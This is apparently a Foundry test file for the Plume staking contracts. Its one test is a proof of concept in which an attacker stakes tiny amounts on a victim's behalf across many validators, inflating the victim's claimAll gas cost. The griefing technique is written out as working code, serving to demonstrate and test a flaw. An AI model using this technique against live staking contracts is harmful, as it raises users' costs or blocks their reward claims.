// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import core Plume system
//import {Plume} from "src/Plume.sol";
import {PlumeStakingRewardTreasury} from "src/PlumeStakingRewardTreasury.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {ManagementFacet} from "src/facets/ManagementFacet.sol";
import {StakingFacet} from "src/facets/StakingFacet.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";

import {PlumeRoles} from "src/lib/PlumeRoles.sol";
import {IPlumeStakingRewardTreasury} from "src/interfaces/IPlumeStakingRewardTreasury.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {IAccessControl} from "src/interfaces/IAccessControl.sol";

import {ISolidStateDiamond} from "@solidstate/proxy/diamond/ISolidStateDiamond.sol";
import {IERC2535DiamondCutInternal} from "@solidstate/interfaces/IERC2535DiamondCutInternal.sol";
import {PlumeStakingRewardTreasuryProxy} from "src/proxy/PlumeStakingRewardTreasuryProxy.sol";

// ERC20 interface
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// --- Test ---
contract StakeOnBehalfTest is Test {
    // Diamond Proxy Address
    PlumeStaking internal diamondProxy;
    PlumeStakingRewardTreasury public treasury;

    // Addresses
    address public constant ADMIN_ADDRESS = 0xC0A7a3AD0e5A53cEF42AB622381D0b27969c4ab5;
    address payable public constant PLUME_NATIVE = payable(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE); // Payable for treasury funding

    address public admin;

    // Constants
    uint256 public constant MIN_STAKE = 1e17; // 0.1 PLUME for stress testing
    uint256 public constant INITIAL_COOLDOWN = 7 days; // Keep real cooldown
    uint16 public constant NUM_VALIDATORS = 15;
    uint256 public constant VALIDATOR_COMMISSION = 0.005 * 1e18; // 0.5% scaled by 1e18

    // Approx 5% APR for PLUME rewards per second = (0.05 * 1e18) / (365 days * 24 hours * 60 mins * 60 secs)
    uint256 public constant PLUME_REWARD_RATE_PER_SECOND = 1_585_489_599; // ~5% APR (5e16 / 31536000)

    function setUp() public {
        console2.log("Starting Test setup");

        admin = ADMIN_ADDRESS;

        vm.deal(admin, 10_000 ether); // Ensure admin has funds

        vm.startPrank(admin);

        // 1. Deploy Diamond Proxy
        diamondProxy = new PlumeStaking();
        assertEq(
            ISolidStateDiamond(payable(address(diamondProxy))).owner(), admin, "Deployer should be owner initially"
        );

        // 2. Deploy Custom Facets
        AccessControlFacet accessControlFacet = new AccessControlFacet();
        StakingFacet stakingFacet = new StakingFacet();
        RewardsFacet rewardsFacet = new RewardsFacet();
        ValidatorFacet validatorFacet = new ValidatorFacet();
        ManagementFacet managementFacet = new ManagementFacet();

        // 3. Prepare Diamond Cut
        IERC2535DiamondCutInternal.FacetCut[] memory cut = new IERC2535DiamondCutInternal.FacetCut[](5);

        // --- Get Selectors (using helper or manual list) ---
        bytes4[] memory accessControlSigs = new bytes4[](7);
        accessControlSigs[0] = AccessControlFacet.initializeAccessControl.selector;
        accessControlSigs[1] = IAccessControl.hasRole.selector;
        accessControlSigs[2] = IAccessControl.getRoleAdmin.selector;
        accessControlSigs[3] = IAccessControl.grantRole.selector;
        accessControlSigs[4] = IAccessControl.revokeRole.selector;
        accessControlSigs[5] = IAccessControl.renounceRole.selector;
        accessControlSigs[6] = IAccessControl.setRoleAdmin.selector;

        bytes4[] memory stakingSigs = new bytes4[](13);
        stakingSigs[0] = StakingFacet.stake.selector;
        stakingSigs[1] = StakingFacet.restake.selector;
        stakingSigs[2] = bytes4(keccak256("unstake(uint16)"));
        stakingSigs[3] = bytes4(keccak256("unstake(uint16,uint256)"));
        stakingSigs[4] = StakingFacet.withdraw.selector;
        stakingSigs[5] = StakingFacet.stakeOnBehalf.selector;
        stakingSigs[6] = StakingFacet.stakeInfo.selector;
        stakingSigs[7] = StakingFacet.amountStaked.selector;
        stakingSigs[8] = StakingFacet.amountCooling.selector;
        stakingSigs[9] = StakingFacet.amountWithdrawable.selector;
        stakingSigs[10] = StakingFacet.getUserValidatorStake.selector;
        stakingSigs[11] = StakingFacet.restakeRewards.selector;
        stakingSigs[12] = StakingFacet.totalAmountStaked.selector;

        bytes4[] memory rewardsSigs = new bytes4[](15);
        rewardsSigs[0] = RewardsFacet.addRewardToken.selector;
        rewardsSigs[1] = RewardsFacet.removeRewardToken.selector;
        rewardsSigs[2] = RewardsFacet.setRewardRates.selector;
        rewardsSigs[3] = RewardsFacet.setMaxRewardRate.selector;
        rewardsSigs[4] = bytes4(keccak256("claim(address)"));
        rewardsSigs[5] = bytes4(keccak256("claim(address,uint16)"));
        rewardsSigs[6] = RewardsFacet.claimAll.selector;
        rewardsSigs[7] = RewardsFacet.earned.selector;
        rewardsSigs[8] = RewardsFacet.getClaimableReward.selector;
        rewardsSigs[9] = RewardsFacet.getRewardTokens.selector;
        rewardsSigs[10] = RewardsFacet.getMaxRewardRate.selector;
        rewardsSigs[11] = RewardsFacet.tokenRewardInfo.selector;
        rewardsSigs[12] = RewardsFacet.setTreasury.selector;
        rewardsSigs[13] = RewardsFacet.getPendingRewardForValidator.selector;

        bytes4[] memory validatorSigs = new bytes4[](14);
        validatorSigs[0] = ValidatorFacet.addValidator.selector;
        validatorSigs[1] = ValidatorFacet.setValidatorCapacity.selector;
        validatorSigs[2] = ValidatorFacet.setValidatorCommission.selector;
        validatorSigs[3] = ValidatorFacet.setValidatorAddresses.selector;
        validatorSigs[4] = ValidatorFacet.setValidatorStatus.selector;
        validatorSigs[5] = ValidatorFacet.getValidatorInfo.selector;
        validatorSigs[6] = ValidatorFacet.getValidatorStats.selector;
        validatorSigs[7] = ValidatorFacet.getUserValidators.selector;
        validatorSigs[8] = ValidatorFacet.getAccruedCommission.selector;
        validatorSigs[9] = ValidatorFacet.getValidatorsList.selector;
        validatorSigs[10] = ValidatorFacet.getActiveValidatorCount.selector;
        validatorSigs[11] = ValidatorFacet.requestCommissionClaim.selector;
        validatorSigs[12] = ValidatorFacet.voteToSlashValidator.selector;
        validatorSigs[13] = ValidatorFacet.slashValidator.selector;

        bytes4[] memory managementSigs = new bytes4[](6); // Size reduced from 7 to 6
        managementSigs[0] = ManagementFacet.setMinStakeAmount.selector;
        managementSigs[1] = ManagementFacet.setCooldownInterval.selector;
        managementSigs[2] = ManagementFacet.adminWithdraw.selector;
        managementSigs[3] = ManagementFacet.getMinStakeAmount.selector; // Index shifted from 4
        managementSigs[4] = ManagementFacet.getCooldownInterval.selector; // Index shifted from 5
        managementSigs[5] = ManagementFacet.setMaxSlashVoteDuration.selector; // Index shifted from 6

        // Define the Facet Cuts
        cut[0] = IERC2535DiamondCutInternal.FacetCut({
            target: address(accessControlFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: accessControlSigs
        });
        cut[1] = IERC2535DiamondCutInternal.FacetCut({
            target: address(managementFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: managementSigs
        });
        cut[2] = IERC2535DiamondCutInternal.FacetCut({
            target: address(stakingFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: stakingSigs
        });
        cut[3] = IERC2535DiamondCutInternal.FacetCut({
            target: address(validatorFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: validatorSigs
        });
        cut[4] = IERC2535DiamondCutInternal.FacetCut({
            target: address(rewardsFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: rewardsSigs
        });

        // 4. Execute Diamond Cut
        ISolidStateDiamond(payable(address(diamondProxy))).diamondCut(cut, address(0), "");
        console2.log("Diamond cut applied.");

        // 5. Initialize
        diamondProxy.initializePlume(
            address(0),
            MIN_STAKE,
            INITIAL_COOLDOWN,
            1 days, // maxSlashVoteDuration
            50e16 // maxAllowedValidatorCommission (50%)
        );
        AccessControlFacet(address(diamondProxy)).initializeAccessControl();
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.ADMIN_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, admin); // Grant reward manager
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.TIMELOCK_ROLE, admin);
        console2.log("Diamond initialized.");

        // 6. Deploy and setup reward treasury
        PlumeStakingRewardTreasury treasuryImpl = new PlumeStakingRewardTreasury();
        bytes memory initData =
            abi.encodeWithSelector(PlumeStakingRewardTreasury.initialize.selector, admin, address(diamondProxy));
        PlumeStakingRewardTreasuryProxy treasuryProxy =
            new PlumeStakingRewardTreasuryProxy(address(treasuryImpl), initData);
        treasury = PlumeStakingRewardTreasury(payable(address(treasuryProxy)));
        RewardsFacet(address(diamondProxy)).setTreasury(address(treasury));
        console2.log("Treasury deployed and set.");

        // 7. Setup Validators (15)
        uint256 defaultMaxCapacity = 1_000_000_000 ether; // High capacity
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            address valAdmin = vm.addr(uint256(keccak256(abi.encodePacked("validatorAdmin", i))));
            vm.deal(valAdmin, 1 ether); // Give admin some gas money
            ValidatorFacet(address(diamondProxy)).addValidator(
                i,
                VALIDATOR_COMMISSION,
                valAdmin, // Use unique admin
                valAdmin, // Use same address for withdraw for simplicity
                string(abi.encodePacked("l1val", i)),
                string(abi.encodePacked("l1acc", i)),
                vm.addr(uint256(keccak256(abi.encodePacked("l1evm", i)))),
                defaultMaxCapacity
            );
        }
        console2.log("%d validators added.", NUM_VALIDATORS);

        // 8. Add PLUME_NATIVE as the only reward token
        RewardsFacet(address(diamondProxy)).addRewardToken(
            PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND, PLUME_REWARD_RATE_PER_SECOND * 2
        );
        treasury.addRewardToken(PLUME_NATIVE); // Also add to treasury allowed list
        vm.deal(address(treasury), 1_000_000 ether); // Give treasury a large amount of native ETH for rewards
        console2.log("PLUME_NATIVE reward token added and treasury funded.");

        vm.stopPrank();
        console2.log("Test setup complete.");
    }

    function testStakeOnBehalfGrief() public {
        // Actors
        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        // Fund both so they can call payable functions
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // Facet handles
        StakingFacet staking = StakingFacet(address(diamondProxy));
        RewardsFacet rewards = RewardsFacet(address(diamondProxy));
        ValidatorFacet validators = ValidatorFacet(address(diamondProxy));

        // Gather validator IDs via getValidatorsList()
        ValidatorFacet.ValidatorListData[] memory vlist = validators.getValidatorsList();
        require(vlist.length > 0, "no validators in setup");
        uint16[] memory vids = new uint16[](vlist.length);
        for (uint256 i = 0; i < vlist.length; i++) {
            vids[i] = vlist[i].id;
        }

        // Give the victim ONE legit stake first (baseline participant)
        {
            uint16 v0 = vids[0];
            vm.prank(victim);
            staking.stake{value: 1 ether}(v0);
        }

        // Baseline gas for claimAll() before spam
        uint256 gasBeforeBaseline;
        uint256 gasAfterBaseline;
        uint256 gasUsedBaseline;
        {
            vm.prank(victim);
            gasBeforeBaseline = gasleft();
            uint256[] memory claims = rewards.claimAll();
            gasAfterBaseline = gasleft();
            gasUsedBaseline = gasBeforeBaseline - gasAfterBaseline;
            console2.log("Baseline claimAll gas (before spam):", gasUsedBaseline, "claims.len=", claims.length);
        }

        // --- Grief: attacker min‑stakes on behalf of victim across many validators ---
        uint256 spamCount = vids.length;
        if (spamCount > 50) spamCount = 50; // keep test fast; increase to amplify effect

        vm.startPrank(attacker);
        for (uint256 i = 0; i < spamCount; i++) {
            uint16 vid = vids[i % vids.length];
            // minStakeAmount is enough to create the association and bloat victim's userValidators
            staking.stakeOnBehalf{value: MIN_STAKE}(vid, victim);
        }
        vm.stopPrank();

        // Verify victim now associated with many validators
        {
            uint16[] memory victimVids = validators.getUserValidators(victim);
            console2.log("Victim associated validator count after spam:", victimVids.length);
            assertGt(victimVids.length, 1, "spam did not increase victim associations");
        }

        // Gas for claimAll() AFTER spam — should scale ~linearly with spamCount
        uint256 gasBeforeSpam;
        uint256 gasAfterSpam;
        uint256 gasUsedAfterSpam;
        {
            vm.prank(victim);
            gasBeforeSpam = gasleft();
            rewards.claimAll();
            gasAfterSpam = gasleft();
            gasUsedAfterSpam = gasBeforeSpam - gasAfterSpam;
            console2.log("Post spam claimAll gas:", gasUsedAfterSpam);
        }

        // Show amplification factor and assert meaningful increase
        uint256 amplification = (gasUsedAfterSpam * 1e6) / (gasUsedBaseline == 0 ? 1 : gasUsedBaseline);
        console2.log("Gas amplification (ppm):", amplification);

        // Expect at least ~2x with 25–50 junk associations; adjust threshold if your setup differs
        assertTrue(gasUsedAfterSpam > gasUsedBaseline * 2, "claimAll gas did not meaningfully increase after spam");
    }
}
